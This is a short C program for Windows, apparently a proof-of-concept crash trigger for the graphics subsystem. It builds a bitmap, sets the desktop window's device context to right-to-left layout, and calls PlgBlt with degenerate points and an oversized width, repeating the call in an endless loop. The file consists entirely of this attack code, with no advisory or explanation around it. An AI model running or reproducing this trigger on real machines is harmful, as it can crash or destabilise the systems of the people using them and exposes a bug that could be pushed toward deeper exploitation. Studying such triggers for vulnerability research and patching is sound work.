#include <windows.h>
#include <stdio.h>

BYTE buf1[0xB8 * 8 * 4] = { 0 };

void crash()
{
    HBITMAP hbm = CreateBitmap(8, 0xB8, 1, 1, &buf1);
    HDC hdcA = GetWindowDC(NULL);
    SetLayout(hdcA, LAYOUT_RTL);
    POINT p1[3] = { { 0x0, -1 }, { 0x0, 0x0 }, { 0x0, 0x0 } };
    PlgBlt(hdcA, p1, hdcA, 0, 0, 0x4000, 1, hbm, 0, 0);
}

int main(int argc, char *argv[])
{
    while (TRUE) {
            crash();
    }

    return 0;
}